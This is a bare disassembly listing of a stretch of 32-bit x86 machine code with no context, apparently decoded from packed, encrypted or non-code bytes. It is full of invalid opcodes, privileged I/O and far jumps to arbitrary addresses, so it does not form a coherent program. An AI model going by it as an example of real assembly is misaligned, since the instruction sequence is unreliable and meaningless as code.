  412cb4:	jmp    0x412c75
  412cb6:	test   eax,0x9bdaa0b1
  412cbb:	call   0x3cea:0x68f6f871
  412cc2:	cmc    
  412cc3:	ror    BYTE PTR [edx-0x1d],cl
  412cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cc7:	add    ebp,eax
  412cc9:	push   cs
  412cca:	rcr    BYTE PTR [eax-0x18581073],0x46
  412cd1:	test   eax,0x5e21979
  412cd6:	ja     0x412ceb
  412cd8:	ss sbb al,0xcd
  412cdb:	pop    esi
  412cdc:	mov    DWORD PTR [esi-0x133e14bf],esi
  412ce2:	lock and DWORD PTR [esi+ebp*4+0x731252c4],esp
  412cea:	jne    0x412cf3
  412cec:	and    ah,BYTE PTR [edi+0xf]
  412cef:	call   DWORD PTR [eax+0x8510160]
  412cf5:	sbb    DWORD PTR [ebx],edx
  412cf7:	loope  0x412d14
  412cf9:	pop    ecx
  412cfa:	fwait
  412cfb:	xor    DWORD PTR [edi],ebx
  412cfd:	inc    eax
  412cfe:	xchg   DWORD PTR [ebp-0x7696cba6],edi
  412d04:	inc    ecx
  412d05:	sub    esp,DWORD PTR [edx+esi*2+0x6b]
  412d09:	mul    BYTE PTR [ecx+0x199eb01d]
  412d0f:	ins    BYTE PTR es:[edi],dx
  412d10:	xchg   ebx,eax
  412d11:	jnp    0x412ca6
  412d13:	shl    DWORD PTR [ebp+0x6ecea444],0xac
  412d1a:	pop    ss
  412d1b:	jl     0x412c9d
  412d1d:	idiv   DWORD PTR [esi-0x6df17c4a]
  412d23:	lahf   
  412d24:	xchg   BYTE PTR gs:0xed34f930,ah
  412d2b:	cmp    al,0x27
  412d2d:	jecxz  0x412d01
  412d2f:	lock popa 
  412d31:	mov    eax,ds:0x8a8f132d
  412d36:	jno    0x412da4
  412d38:	and    esi,DWORD PTR [ebp+0x3a]
  412d3b:	scas   al,BYTE PTR es:[edi]
  412d3c:	hlt    
  412d3d:	pop    esi
  412d3e:	sbb    DWORD PTR [esi],0x56894d5a
  412d44:	mov    ebx,0x5deb6ea6
  412d49:	cmp    al,0xa2
  412d4b:	fs mov dl,0xcb
  412d4e:	out    0x8a,eax
  412d50:	adc    eax,0x8aa3ff01
  412d55:	ins    DWORD PTR es:[edi],dx
  412d56:	inc    ecx
  412d57:	cmp    ebx,DWORD PTR [ecx]
  412d59:	cdq    
  412d5a:	out    dx,al
  412d5b:	inc    esi
  412d5c:	jmp    0x20a1b5a8
  412d61:	or     al,ch
  412d63:	pop    edi
  412d64:	push   ecx
  412d65:	cli    
  412d66:	mov    WORD PTR [ecx],es
  412d68:	sub    ebp,DWORD PTR [esi+ecx*4+0x1472edb3]
  412d6f:	js     0x412d17
  412d71:	in     eax,dx
  412d72:	mov    ah,0x61
  412d74:	fidivr DWORD PTR [esi-0x56]
  412d77:	jl     0x412ded
  412d79:	dec    ebp
  412d7a:	sahf   
  412d7b:	lahf   
  412d7c:	outs   dx,BYTE PTR ds:[esi]
  412d7d:	ret    
  412d7e:	jmp    0x282f:0x59c5bcf6
  412d85:	inc    edi
  412d86:	shl    DWORD PTR [eax+ebp*8],1
  412d89:	loope  0x412d84
  412d8b:	lahf   
  412d8c:	push   ebp
  412d8d:	pop    edx
  412d8e:	repnz cmp BYTE PTR [ebp+0x26],dh
  412d92:	push   es
  412d93:	jbe    0x412dfa
  412d95:	mov    ?,WORD PTR [ecx]
  412d97:	push   esp
  412d98:	pop    edi
  412d99:	or     ebp,DWORD PTR [edx-0x48]
  412d9c:	push   ss
  412d9d:	push   0xc78d4d4
  412da2:	pop    edi
  412da3:	loop   0x412d32
  412da5:	ja     0x412d2e
  412da7:	stos   DWORD PTR es:[edi],eax
  412da8:	xchg   edi,esp
  412daa:	jp     0x412da1
  412dac:	push   ebp
  412dad:	jo     0x412d3e
  412daf:	out    dx,eax
  412db0:	mov    ds,WORD PTR [edx]
  412db2:	xchg   ebp,eax
  412db3:	pop    ebp
  412db4:	mov    ds:0xf289cd1c,al
  412db9:	dec    esp
  412dba:	mov    eax,DWORD PTR [ebp-0x57]
  412dbd:	xrelease xchg BYTE PTR [eax],cl
  412dc0:	fs push esp
  412dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dc3:	iret   
  412dc4:	out    0xb7,eax
  412dc6:	mov    cs,ebp
  412dc8:	add    bl,BYTE PTR [ebx]
  412dca:	pop    edi
  412dcb:	bound  ebp,QWORD PTR [edx+0x5f]
  412dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dcf:	jge    0x412dc2
  412dd1:	or     al,0x82
  412dd3:	test   eax,0x729ec444
  412dd8:	lahf   
  412dd9:	cmp    eax,0x4cea38c0
  412dde:	pcmpgtw mm6,QWORD PTR [ebx+0x6d]
  412de2:	jecxz  0x412d91
  412de4:	mov    ch,0xb7
  412de6:	adc    DWORD PTR [ecx],esp
  412de8:	loope  0x412e28
  412dea:	dec    ebp
  412deb:	out    dx,eax
  412dec:	xor    DWORD PTR [eax],edi
  412dee:	mov    esp,0x33daffc
  412df3:	cwde   
  412df4:	push   esp
  412df5:	out    dx,al
  412df6:	daa    
  412df7:	retf   
  412df8:	lahf   
  412df9:	sbb    al,0xe4
  412dfb:	stc    
  412dfc:	sbb    ebp,eax
  412dfe:	sub    esi,esp
  412e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e01:	and    dh,BYTE PTR [ebp+0x690a8da5]
  412e07:	push   eax
  412e08:	and    eax,DWORD PTR [esi]
  412e0a:	(bad)  [edx+0x30]
  412e0d:	push   esp
  412e0e:	mov    dl,0x32
  412e10:	fidiv  DWORD PTR [eax-0x1b]
  412e13:	push   ss
  412e14:	cld    
  412e15:	xor    BYTE PTR [ebp-0x3728b2d6],bl
  412e1b:	add    DWORD PTR [ebx+eax*4],ebx
  412e1e:	mov    ah,0x1e
  412e20:	mov    ah,0xc2
  412e22:	xor    al,ah
  412e24:	jl     0x412e96
  412e26:	or     ebp,edx
  412e28:	xchg   ebx,eax
  412e29:	inc    esp
  412e2a:	push   0xd0e38afb
  412e2f:	pop    es
  412e30:	mov    edx,DWORD PTR [ebx-0x32]
  412e33:	adc    BYTE PTR [edi+0x2],bl
  412e36:	xchg   edx,eax
  412e37:	std    
  412e38:	fiadd  WORD PTR ds:0x17c915d4
  412e3e:	les    eax,FWORD PTR [edx+0x6f]
  412e41:	sbb    DWORD PTR [ebx+0x59],eax
  412e44:	lods   eax,DWORD PTR ds:[esi]
  412e45:	sub    DWORD PTR [esi+0x3e],ecx
  412e48:	add    ch,BYTE PTR [edx+0x21]
  412e4b:	lock xchg sp,ax
  412e4e:	inc    eax
  412e4f:	mov    al,ds:0x8263d034
  412e54:	add    al,0x10
  412e56:	mov    DWORD PTR cs:[ebx],esi
  412e59:	xlat   BYTE PTR ds:[ebx]
  412e5a:	das    
  412e5b:	adc    al,0x65
  412e5d:	add    dl,BYTE PTR [ebx+ebp*1-0xea2accf]
  412e64:	stos   DWORD PTR es:[edi],eax
  412e65:	je     0x412e64
  412e67:	push   es
  412e68:	cli    
  412e69:	pop    ds
  412e6a:	dec    ecx
  412e6b:	ror    DWORD PTR [edi+0x377b9a32],0x6e
  412e72:	or     BYTE PTR [esi+0x53],cl
  412e75:	xor    BYTE PTR [ecx],bh
  412e77:	inc    esp
  412e78:	pop    es
  412e79:	mov    es,WORD PTR [edx+0x2a9db83a]
  412e7f:	ds (bad) 
  412e81:	push   edx
  412e82:	mov    ds:0x49a2b9da,eax
  412e87:	pop    esi
  412e88:	repnz into 
  412e8a:	sub    al,0x6b
  412e8c:	cmp    edx,DWORD PTR ds:0x8e700ff7
  412e92:	shr    BYTE PTR [edi+0x3ffa4ad8],1
  412e98:	mov    bl,0xd2
  412e9a:	fisub  DWORD PTR [ebp-0x24203847]
  412ea0:	cwde   
  412ea1:	fiadd  DWORD PTR [edi-0x57]
  412ea4:	jne    0x412eec
  412ea6:	add    bh,BYTE PTR [eax+0x31]
  412ea9:	aaa    
  412eaa:	mov    dh,0xa5
  412eac:	inc    esp
  412ead:	ds gs hlt 
  412eb0:	push   ss
  412eb1:	ds call 0x5649:0xb3d0288
  412eb9:	sbb    bl,BYTE PTR [edi+ebp*8]
  412ebc:	int    0x90
  412ebe:	cmp    BYTE PTR [ebp+0x3f5249a3],al
  412ec4:	ret    
  412ec5:	sahf   
  412ec6:	(bad)  [ebx-0x3e8d3507]
  412ecc:	push   0x9ae5cca0
  412ed1:	rol    dh,1
  412ed3:	fdiv   st,st(3)
  412ed5:	sbb    eax,0x3e3b7109
  412eda:	jle    0x412efd
  412edc:	ins    DWORD PTR es:[edi],dx
  412edd:	and    ebp,edx
  412edf:	in     eax,dx
  412ee0:	mov    WORD PTR [eax],?
  412ee2:	das    
  412ee3:	ficomp WORD PTR [esi-0x14]
  412ee7:	jo     0x412ef3
  412ee9:	mov    cl,0x98
  412eeb:	pop    ds
  412eec:	stc    
  412eed:	sub    ebx,DWORD PTR [edx-0x5d96135c]
  412ef3:	ficomp DWORD PTR [eax+0x45bb8ac8]
  412ef9:	or     DWORD PTR ds:[esi-0x48c559b1],ecx
  412f00:	adc    BYTE PTR [esi+0x7b],bh
  412f03:	jmp    0x412e8d
  412f05:	dec    edi
  412f06:	mov    esp,0xb33d0893
  412f0b:	push   ss
  412f0c:	enter  0x38b8,0xdc
  412f10:	outs   dx,DWORD PTR ds:[esi]
  412f11:	jmp    0xba018745
  412f16:	push   eax
  412f17:	cmp    eax,0xed0fceae
  412f1c:	jo     0x412f63
  412f1e:	(bad)  
  412f20:	mov    dl,0x75
  412f22:	call   0x60d:0xa6eeba4c
  412f29:	in     al,0x43
  412f2b:	pop    edx
  412f2c:	xor    eax,DWORD PTR [eax+0x65]
  412f2f:	jbe    0x412ef8
  412f31:	scas   al,BYTE PTR es:[edi]
  412f32:	lock and dl,BYTE PTR [ecx-0x45f07a49]
  412f39:	inc    ebp
  412f3a:	es ins DWORD PTR es:[edi],dx
  412f3c:	std    
  412f3d:	in     eax,0xfb
  412f3f:	loopne 0x412ee7
  412f41:	or     eax,0xaa214022
  412f46:	aad    0x7c
  412f48:	std    
  412f49:	out    dx,eax
  412f4a:	fcomp  DWORD PTR [edx+0x7a5166f8]
  412f50:	jp     0x412fad
  412f52:	call   0x30d5:0xacd5bd69
  412f59:	ins    BYTE PTR es:[edi],dx
  412f5a:	(bad)  
  412f5b:	and    BYTE PTR [ebx-0x4dbab84a],al
  412f61:	pop    ebx
  412f62:	ss jmp 0x412f55
  412f65:	sub    eax,0x37c7e9be
  412f6a:	xor    ah,ah
  412f6c:	nop
  412f6d:	out    dx,al
  412f6e:	std    
  412f6f:	lock dec eax
  412f71:	xor    edi,DWORD PTR [eax]
  412f73:	fidivr WORD PTR [edx-0x440adf03]
  412f79:	inc    ebx
  412f7a:	jne    0x412f6b
  412f7c:	push   ss
  412f7d:	cli    
  412f7e:	in     eax,0xba
  412f80:	dec    ebp
  412f81:	cwde   
  412f82:	push   eax
  412f83:	xor    BYTE PTR [ebp-0x43],ch
  412f86:	mov    BYTE PTR [esi-0x1f],dh
  412f89:	add    ebp,DWORD PTR [ebp-0x3a]
  412f8c:	in     al,dx
  412f8d:	or     DWORD PTR [edi],edi
  412f8f:	leave  
  412f90:	call   0x242babb4
  412f95:	xchg   ebp,eax
  412f96:	call   0xb31e:0x9f382048
  412f9d:	dec    esp
  412f9e:	sbb    DWORD PTR [ebp+eiz*2-0x5f3607d9],0xfffffff1
  412fa6:	inc    esi
  412fa7:	cs cli 
  412fa9:	xchg   ebp,eax
  412faa:	pop    esi
  412fab:	inc    ecx
  412fac:	pop    ebx
  412fad:	or     DWORD PTR [ebp+0x62],ebp
  412fb0:	jecxz  0x412f40
  412fb2:	pop    esp
  412fb3:	sbb    ecx,DWORD PTR [ebp-0x68336d91]
  412fb9:	and    DWORD PTR cs:[ebx+0x5149fd16],ecx
  412fc0:	jno    0x412fb9
  412fc2:	int    0x76
  412fc4:	push   cs
  412fc5:	daa    
  412fc6:	es cld 
  412fc8:	push   0x59c78be4
  412fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fce:	in     eax,0x7a
  412fd0:	loop   0x412f6a
  412fd2:	xchg   ecx,eax
  412fd3:	fadd   QWORD PTR [esp+ebx*4]
  412fd6:	lahf   
  412fd7:	pop    edx
  412fd8:	and    eax,0x95133bc3
  412fdd:	inc    BYTE PTR [ebx+0x5e]
  412fe0:	leave  
  412fe1:	sti    
  412fe2:	xor    DWORD PTR [edi-0x1962f80e],eax
  412fe8:	add    BYTE PTR [ecx],ah
  412fea:	test   al,0xf7
  412fec:	pop    ds
  412fed:	pop    esp
  412fee:	test   al,0x4d
  412ff0:	and    eax,0xfdc86bb6
  412ff5:	test   eax,0xa9a16c41
  412ffa:	jbe    0x412fd4
  412ffc:	xchg   ebp,eax
  412ffd:	mov    dh,0x71
  412fff:	dec    edx
  413000:	les    ebp,FWORD PTR [ecx-0x234efb48]
  413006:	fstp   st(5)
  413008:	sbb    BYTE PTR [edi+0x36ce3049],dl
  41300e:	sub    cl,cl
  413010:	mov    ds:0xb19d94e3,eax
  413015:	imul   ecx,DWORD PTR [ebx-0x281ec21c],0x7682d2ad
  41301f:	inc    ebx
  413020:	xchg   edi,eax
  413021:	mov    ds:0x110817ee,eax
  413026:	mov    bh,0xb4
  413028:	adc    al,0xdc
  41302a:	bound  eax,QWORD PTR ds:0x1f855510
  413030:	xchg   BYTE PTR [esi],ah
  413032:	lds    esi,FWORD PTR ds:0x8b83e008
  413038:	push   cs
  413039:	call   0x6300:0x142e7319
  413040:	xchg   ebp,eax
  413041:	or     esp,DWORD PTR [esp+ebp*4+0x496a8bd2]
  413048:	nop
  413049:	jno    0x41309b
  41304b:	in     eax,0x97
  41304d:	ss xchg edx,eax
  41304f:	dec    ebx
  413050:	xchg   ebx,eax
  413051:	retf   0x831f
  413054:	add    ebp,ecx
  413056:	mov    dh,0xb1
  413058:	mov    edx,0xa4a62e15
  41305d:	loope  0x412fe8
  41305f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  413061:	dec    DWORD PTR [esi-0x332bc3ec]
  413067:	rcl    dl,cl
  413069:	mov    bh,0x9a
  41306b:	ins    DWORD PTR es:[edi],dx
  41306c:	dec    ebp
  41306d:	jmp    0x4130c8
  41306f:	aas    
  413070:	dec    ebp
  413071:	lea    ebp,[esi+0x89d7115]
  413077:	pop    edi
  413078:	or     al,BYTE PTR [edi]
  41307a:	loop   0x41309d
  41307c:	push   ebp
  41307d:	adc    al,0x53
  41307f:	test   eax,0x6f911dbf
  413084:	push   ecx
  413085:	mov    ebp,0x64710e39
  41308a:	in     al,dx
  41308b:	(bad)  
  41308d:	lods   al,BYTE PTR ds:[esi]
  41308e:	push   ecx
  41308f:	fstp   DWORD PTR [ebp-0x2d]
  413092:	int3   
  413093:	call   0x6377f4ef
  413098:	jge    0x41310b
  41309a:	dec    eax
  41309b:	xchg   esi,eax
  41309c:	push   ds
  41309d:	outs   dx,BYTE PTR ds:[esi]
  41309e:	or     bl,0xc7
  4130a1:	pop    ebx
  4130a2:	stos   DWORD PTR es:[edi],eax
  4130a3:	ret    0xddf1
  4130a6:	adc    eax,0x5165ce2a
  4130ab:	mov    BYTE PTR [edx],0x41
  4130ae:	ror    BYTE PTR [edi],1
  4130b0:	pushf  
  4130b1:	sub    ah,bl
  4130b3:	xor    BYTE PTR [ebx-0x40],cl
  4130b6:	push   edx
  4130b7:	adc    bl,BYTE PTR [eax+0x61]
  4130ba:	not    BYTE PTR [ebp+0x14363653]
  4130c0:	xchg   ebp,eax
  4130c1:	or     al,0x2c
  4130c3:	inc    esp
  4130c4:	out    0x61,al
  4130c6:	and    BYTE PTR [edx-0x26],dh
  4130c9:	push   0xffffffcc
  4130cb:	jg     0x41307c
  4130cd:	bnd jp 0x4130b2
  4130d0:	push   ecx
  4130d1:	or     eax,0x9803c9a8
  4130d6:	jb     0x41314e
  4130d8:	sti    
  4130d9:	sahf   
  4130da:	cmp    eax,0x82dcff76
  4130df:	mov    eax,0x1863e9bb
  4130e4:	addr16 sub eax,0xfe86626d
  4130ea:	inc    edx
  4130eb:	sbb    eax,0xdbe5534
  4130f0:	es sub al,0x67
  4130f3:	inc    ebp
  4130f4:	or     cl,BYTE PTR [edi]
  4130f6:	sti    
  4130f7:	add    ah,bh
  4130f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130fa:	pop    ebp
  4130fb:	outs   dx,DWORD PTR ds:[esi]
  4130fc:	sub    ch,BYTE PTR [ebx+0x61]
  4130ff:	sbb    eax,0x41
  413102:	mov    ebx,0x829488b1
  413107:	jp     0x4130b9
  413109:	or     al,0xbc
  41310b:	push   ebp
  41310c:	cmp    al,0x29
  41310e:	pop    esp
  41310f:	pop    esp
  413110:	jne    0x4130ae
  413112:	idiv   BYTE PTR [eax-0xeb6cb4b]
  413118:	ret    0xb8ed
  41311b:	xor    al,0x54
  41311d:	lods   eax,DWORD PTR ds:[esi]
  41311e:	push   0xffffff92
  413120:	bound  edx,QWORD PTR [eax-0x6b]
  413123:	inc    esp
  413124:	rcr    BYTE PTR [edx-0x45],0xe6
  413128:	bound  ebx,QWORD PTR [ebx-0xa]
  41312b:	jbe    0x4130b9
  41312d:	outs   dx,DWORD PTR ds:[esi]
  41312e:	sar    eax,cl
  413130:	rcl    BYTE PTR [ebp+0x36ad2f51],1
  413136:	sar    ch,0x45
  413139:	popa   
  41313a:	inc    edi
  41313b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41313c:	nop
  41313d:	dec    ecx
  41313e:	fwait
  41313f:	cdq    
  413140:	jae    0x41310d
  413142:	and    dh,BYTE PTR [esi-0x6c]
  413145:	and    esi,ebp
  413147:	pop    ebx
  413148:	xor    eax,0x48efc842
  41314d:	mov    dl,0x90
  41314f:	daa    
  413150:	out    0x5e,eax
  413152:	shr    DWORD PTR [edi],1
  413154:	mov    edx,0x1f52c050
  413159:	xchg   BYTE PTR [ebp*1-0x16e65f20],cl
  413160:	mov    ds:0x555c5d3d,al
  413165:	scas   al,BYTE PTR es:[edi]
  413166:	(bad)  
  413167:	push   0xffffffac
  413169:	lahf   
  41316a:	push   eax
  41316b:	push   0xffffffa0
  41316d:	push   eax
  41316e:	jg     0x4131ab
  413170:	fld    QWORD PTR [eax-0x6fd8ea0d]
  413176:	bswap  ecx
  413178:	lods   eax,DWORD PTR ds:[esi]
  413179:	sub    eax,0xd78c2b80
  41317e:	dec    esi
  41317f:	popa   
  413180:	data16 stos BYTE PTR es:[edi],al
  413182:	jp     0x41314c
  413184:	add    DWORD PTR [edx-0x44],eax
  413187:	fmul   st,st(0)
  413189:	add    DWORD PTR [esi-0x52c042af],0x7e4e9ef2
  413193:	out    dx,al
  413194:	retf   0x57d7
  413197:	or     BYTE PTR [ecx],bh
  413199:	je     0x413174
  41319b:	fcmovb st,st(2)
  41319d:	fisttp QWORD PTR [edx]
  41319f:	out    dx,al
  4131a0:	dec    ecx
  4131a1:	lock inc eax
  4131a3:	hlt    
  4131a4:	inc    edx
  4131a5:	or     dh,BYTE PTR [ecx]
  4131a7:	push   esp
  4131a8:	pop    edx
  4131a9:	xchg   DWORD PTR [ebx-0x5537e6a4],esp
  4131af:	sbb    al,0x25
  4131b1:	(bad)  
  4131b2:	sbb    eax,0x49254b5f
  4131b7:	fs mov esp,0xcad2099e
  4131bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131be:	in     eax,dx
  4131bf:	pop    es
  4131c0:	data16 xor dl,BYTE PTR [ebx+0x48]
  4131c4:	jmp    0x4131b8
  4131c6:	push   esi
  4131c7:	and    dh,bl
  4131c9:	mov    al,ds:0x6ccc75fa
  4131ce:	adc    DWORD PTR [edi-0x2a],0x7c
  4131d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131d3:	jne    0x41321a
  4131d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131d6:	inc    esp
  4131d7:	pop    ecx
  4131d8:	retf   
  4131d9:	call   0x347ae021
  4131de:	mov    WORD PTR [eax-0x5d],es
  4131e1:	jl     0x413190
  4131e3:	push   es
  4131e4:	gs adc al,0x63
  4131e7:	inc    bl
  4131e9:	add    al,0x7
  4131eb:	pop    edx
  4131ec:	and    BYTE PTR gs:[eax],al
  4131ef:	dec    edx
  4131f0:	jnp    0x41322a
  4131f2:	xchg   BYTE PTR [edi+0x16],ah
  4131f5:	stos   BYTE PTR es:[edi],al
  4131f6:	push   edi
  4131f7:	sub    eax,0x245a48b0
  4131fc:	pop    ss
  4131fd:	add    ah,BYTE PTR [esp+eax*2+0x2864b112]
  413204:	aad    0xb0
  413206:	cmp    eax,0x27513914
  41320b:	jbe    0x413266
  41320d:	div    DWORD PTR [esi]
  41320f:	push   ss
  413210:	xor    bh,BYTE PTR [edi+0x110df52f]
  413216:	dec    eax
  413217:	neg    BYTE PTR [edi+0x4e]
  41321a:	out    0x67,eax
  41321c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41321d:	or     eax,DWORD PTR [edx-0x23cf4808]
  413223:	cmp    DWORD PTR [ecx-0x296742ba],eax
  413229:	inc    edx
  41322a:	dec    ecx
  41322b:	cli    
  41322c:	push   ebx
  41322d:	mov    al,0xee
  41322f:	adc    edx,DWORD PTR [ebx]
  413231:	out    0x16,eax
  413233:	push   ecx
  413234:	scas   al,BYTE PTR es:[edi]
  413235:	int3   
  413236:	jmp    0x49aa:0x469e5f87
  41323d:	aaa    
  41323e:	pop    ds
  41323f:	popf   
  413240:	rcr    BYTE PTR [esi+edi*2-0x22],0x54
  413245:	shr    BYTE PTR ds:0xd8a1ec2b,1
  41324b:	push   0x27699cad
  413250:	aad    0x96
  413252:	ret    
  413253:	add    dh,ah
  413255:	(bad)  
  413256:	lock std 
  413258:	inc    esi
  413259:	arpl   WORD PTR [eax-0x540d83f3],di
  41325f:	leave  
  413260:	retf   
  413261:	inc    edi
  413262:	xchg   ebx,eax
  413263:	xor    dh,BYTE PTR [ebp-0x7198f91a]
  413269:	out    0x21,al
  41326b:	sub    BYTE PTR [ecx+0x28034f45],ah
  413271:	sub    BYTE PTR [edi+0x53],0x9a
  413275:	loope  0x4132e4
  413277:	cwde   
  413278:	retw   
  41327a:	gs das 
  41327c:	mov    ah,0xdb
  41327e:	mov    BYTE PTR [edi],bl
  413280:	cld    
  413281:	sbb    eax,0x80eadabb
  413286:	or     eax,0x2d2eaf3d
  41328b:	mov    ah,0x39
  41328d:	fdiv   QWORD PTR [eax-0x6abeddf1]
  413293:	enter  0x5e84,0x57
  413297:	xchg   ebp,eax
  413298:	dec    ebx
  413299:	sub    al,0xf1
  41329b:	mov    eax,0x7e0385c0
  4132a0:	fnstsw WORD PTR [edi]
  4132a2:	lods   al,BYTE PTR ds:[esi]
  4132a3:	outs   dx,BYTE PTR ds:[esi]
  4132a4:	outs   dx,BYTE PTR ds:[esi]
  4132a5:	test   al,0xea
  4132a7:	add    eax,0x260009b4
  4132ac:	xchg   esp,eax
  4132ad:	popf   
  4132ae:	jne    0x4132d2
  4132b0:	sub    ch,BYTE PTR [esi+0x2d07fd9e]
  4132b6:	mov    ecx,0xdd5ef02e
  4132bb:	xchg   esi,eax
  4132bc:	out    0x6,al
  4132be:	jmp    0xa3e3:0x181626eb
  4132c5:	pusha  
  4132c6:	(bad)  
  4132c7:	sbb    al,0xcb
  4132c9:	adc    ecx,DWORD PTR [eax+ecx*1]
  4132cc:	repz lds ebp,FWORD PTR [eax]
  4132cf:	lock sub eax,0x489c5334
  4132d5:	hlt    
  4132d6:	jle    0x413339
  4132d8:	xchg   BYTE PTR [esi+0x19031760],bh
  4132de:	sar    BYTE PTR [ecx],1
  4132e0:	les    eax,FWORD PTR [edx+eiz*1-0x27014b5e]
  4132e7:	and    al,0x8f
  4132e9:	sub    BYTE PTR [ecx+0x25],ah
  4132ec:	mov    bl,BYTE PTR [eax]
  4132ee:	dec    edi
  4132ef:	mov    esp,0xd40dd980
  4132f4:	push   0xb543dfcf
  4132f9:	push   edi
  4132fa:	int    0x93
  4132fc:	sub    al,0xa
  4132fe:	mov    bh,0xe4
  413300:	jg     0x413367
  413302:	ds mov edx,0xc408c507
  413308:	fidiv  WORD PTR gs:[esi]
  41330b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330c:	xor    eax,0x581b69ca
  413311:	mov    cl,0x75
  413313:	xchg   esp,eax
  413314:	sbb    DWORD PTR [edx+0x7597f59],0xffffff9d
  41331b:	fwait
  41331c:	sub    BYTE PTR [esi],0x9d
  41331f:	adc    ebx,ebp
  413321:	mov    BYTE PTR [edi-0x1d],cl
  413324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413325:	jb     0x413306
  413327:	cmp    BYTE PTR [edx-0x1d],bh
  41332a:	dec    edx
  41332b:	sbb    eax,0xdbadf417
  413330:	dec    eax
  413331:	jmp    0x41339a
  413333:	std    
  413334:	pop    ds
  413335:	daa    
  413336:	(bad)  
  413337:	adc    BYTE PTR [ebp+0x1b],bl
  41333a:	xor    DWORD PTR [edx+edx*1+0x40751c13],edx
  413341:	xchg   ebp,eax
  413342:	jle    0x413380
  413344:	add    DWORD PTR [ebp-0x49143876],ebp
  41334a:	mov    eax,ds:0xa3868bc8
  41334f:	inc    ebx
  413350:	out    0x97,eax
  413352:	cwde   
  413353:	fwait
  413354:	pop    eax
  413355:	jne    0x41335a
  413357:	jbe    0x413302
  413359:	ret    
  41335a:	sbb    ch,al
  41335c:	sti    
  41335d:	cs sahf 
  41335f:	mov    ah,0x94
  413361:	or     esp,DWORD PTR ds:0xfaeb4e5d
  413367:	sti    
  413368:	jo     0x413325
  41336a:	imul   ecx,DWORD PTR [eax-0x532258f9],0xffffff85
  413371:	retf   0x202a
  413374:	push   edi
  413375:	push   ecx
  413376:	mov    esi,0x9fa00a27
  41337b:	das    
  41337c:	sbb    BYTE PTR [ebx],0xda
  41337f:	pop    ebp
  413380:	fsubp  st(4),st
  413382:	mov    ds:0xb8989b1e,al
  413387:	pop    esp
  413388:	stos   DWORD PTR es:[edi],eax
  413389:	fwait
  41338a:	xchg   bh,bh
  41338c:	jmp    0x5b7e:0x39367db1
  413393:	fs addr16 dec edx
  413396:	sti    
  413397:	pop    edx
  413398:	xor    eax,0x88f3db19
  41339d:	sbb    DWORD PTR [ebx-0xc],esp
  4133a0:	push   cs
  4133a1:	(bad)  
  4133a2:	cmp    DWORD PTR [esi+0x7b],esi
  4133a5:	je     0x41332c
  4133a7:	mov    eax,0xbcafc8b0
  4133ac:	(bad)  
  4133ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133af:	pop    ss
  4133b0:	dec    esp
  4133b1:	daa    
  4133b2:	dec    edx
  4133b3:	js     0x413415
  4133b5:	xor    esp,DWORD PTR [esp+ecx*4+0x27]
  4133b9:	stc    
  4133ba:	jo     0x413370
  4133bc:	test   DWORD PTR [edx+0x4e],0x6bf7e907
  4133c3:	inc    BYTE PTR [edi+0x43]
  4133c6:	mov    al,ds:0xa9eab969
  4133cb:	mov    ds:0xf66a3230,al
  4133d0:	jmp    0xe2353ccf
  4133d5:	xchg   ecx,eax
  4133d6:	pop    DWORD PTR [eax-0x5887bc46]
  4133dc:	sub    al,0x21
  4133de:	xor    DWORD PTR [esi+0x12],eax
  4133e1:	inc    edx
  4133e2:	in     eax,0x1
  4133e4:	cwde   
  4133e5:	dec    esi
  4133e6:	in     eax,0x97
  4133e8:	jne    0x41336a
  4133ea:	mov    dl,ch
  4133ec:	aam    0x7
  4133ee:	enter  0x4c5,0x68
  4133f2:	inc    ecx
  4133f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133f4:	aaa    
  4133f5:	xor    ebx,esi
  4133f7:	sti    
  4133f8:	aaa    
  4133f9:	enter  0xe422,0x89
  4133fd:	fisub  DWORD PTR [eax+ebp*4]
  413400:	(bad)
  413403:	aam    0x9f
  413405:	and    ebp,ebx
  413407:	stos   DWORD PTR es:[edi],eax
  413408:	dec    eax
  413409:	jae    0x4133bd
  41340b:	sub    edx,DWORD PTR [ebp+0x33]
  41340e:	push   ecx
  41340f:	xor    DWORD PTR [eax-0x25],edi
  413412:	adc    al,0x32
  413414:	jmp    0x8955:0xf3defd2e
  41341b:	aaa    
  41341c:	jns    0x413493
  41341e:	mov    ecx,0xcb6530d2
  413423:	cmp    BYTE PTR [ecx-0x6d],dl
  413426:	sbb    ebp,ebp
  413428:	in     eax,0xa6
  41342a:	add    edi,edx
  41342c:	addr16 into 
  41342e:	adc    dh,0xea
  413431:	jns    0x41346a
  413433:	gs or  al,0xb3
  413436:	mov    esp,0x26c9b017
  41343b:	out    0xd6,al
  41343d:	sub    dh,al
  41343f:	cmp    BYTE PTR [eax-0x78090969],al
  413445:	pop    gs
  413447:	cmp    eax,0xf564755b
  41344c:	(bad)  
  41344e:	pop    esp
  41344f:	or     BYTE PTR [eax+edx*8-0x1f],bl
  413453:	adc    eax,0xa66e8fcf
  413458:	enter  0x731,0xea
  41345c:	jo     0x413450
  41345e:	mov    al,ds:0xb7e7b000
  413463:	xor    esp,ebp
  413465:	push   edx
  413466:	in     eax,0x7b
  413468:	adc    ch,cl
  41346a:	icebp  
  41346b:	mov    edi,0xc29b97b6
  413470:	arpl   WORD PTR [edx],ax
  413472:	add    al,0x44
  413474:	out    0x20,eax
  413476:	mov    DWORD PTR [esi+0x7],0x268b8ca5
  41347d:	std    
  41347e:	ins    DWORD PTR es:[edi],dx
  41347f:	idiv   dl
  413481:	mov    bh,0xb8
  413483:	xor    esp,esi
  413485:	popf   
  413486:	sbb    DWORD PTR [ebx-0x4f],esi
